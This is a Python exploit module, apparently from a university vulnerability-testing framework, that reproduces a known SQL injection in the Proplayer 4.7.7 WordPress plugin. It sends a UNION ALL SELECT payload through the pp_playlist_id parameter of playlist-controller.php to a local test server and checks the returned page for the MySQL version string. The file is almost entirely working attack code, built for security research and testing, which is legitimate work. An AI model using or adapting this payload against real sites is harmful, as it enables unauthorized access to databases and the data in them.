
# Copyright 2013 University of Maryland.  All rights reserved.
# Use of this source code is governed by a BSD-style
# license that can be found in the LICENSE.TXT file.


import sys
import os
import time

import framework

class Exploit (framework.Exploit):

    attributes = {'Name' :        "EDB_17616",
                  'Description' : "Proplayer 4.7.7 for Wordpress, SQL Injection",
                  'References' :  [['http://www.exploit-db.com/exploits/17616/']], 
                  'Target' :      "Wordpress 2.8.3",
                  'TargetLicense' : '',
                  'Plugin' : "Proplayer 4.7.7",
                  'VulWikiPage' : "N/A",
                  'Type' : 'SQL'
                  }
    found = False
    
    def __init__(self, visible=False):
        framework.Exploit.__init__(self, visible)
        return


    def exploit(self):
        driver = self.create_selenium_driver()
        driver.get("http://127.0.0.1/wordpress/wp-content/plugins/proplayer/playlist-controller.php?pp_playlist_id=-1') UNION ALL SELECT NULL,NULL,@@version--%20")
        count = 0
        while not self.found and count < 5:
            self.found =  "5.5.28-1" in driver.page_source
            time.sleep(1)
            count = count + 1
            if not self.found:
                self.logger.warning("Failed to find element")
            else:
                self.logger.info("Exploit completed")
        
        if self.visible:
            time.sleep(10)

        driver.cleanup()
        return

    def verify(self):
        return self.found
